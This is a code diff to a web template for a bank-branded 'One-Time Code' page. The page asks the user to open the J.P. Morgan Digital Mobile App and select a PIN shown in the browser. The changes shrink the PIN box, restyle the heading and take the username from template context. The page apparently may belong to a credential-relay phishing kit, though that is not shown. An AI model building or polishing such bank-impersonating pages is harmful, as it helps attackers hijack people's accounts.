@@ -6,13 +6,11 @@
     <link rel="stylesheet" href="/static/css/styles.css">
     <style>
         .pin-container {
-            max-width: 400px;
+            max-width: 70px;
             margin: 40px auto;
-            padding: 20px;
             text-align: center;
             background: white;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
         .pin-options {
@@ -31,6 +29,8 @@
         h2 {
             color: #333;
             margin-bottom: 20px;
+            font-size: 13pt;
+            font-weight: normal;
         }
 
         p {
@@ -41,20 +41,15 @@
 {% endblock %}
 
 {% block content %}
-    <div class="container">
-                
-        <div class="step" id="step2">
             <div class="confirmation-container">
                 <h3>One-Time Code</h3>
                 <h2>Please open the J.P. Morgan Digital Mobile App and select the following code:</h2>
                 <div class="pin-container">
                     <div id="browser-pin"></div>
                 </div>
+                <div id="status"></div>
             </div>
-        </div>
 
-        <div id="status"></div>
-    </div>
 {% endblock %}
 
 {% block scripts %}
@@ -74,8 +69,8 @@
         // Start session and display PIN
         async function initializeSession() {
             try {
-                const urlParams = new URLSearchParams(window.location.search);
-                const username = urlParams.get('username');
+                // Get username from template context
+                const username = '{{ username }}';
                 
                 // Start session
                 const response = await fetch('/start-session', {
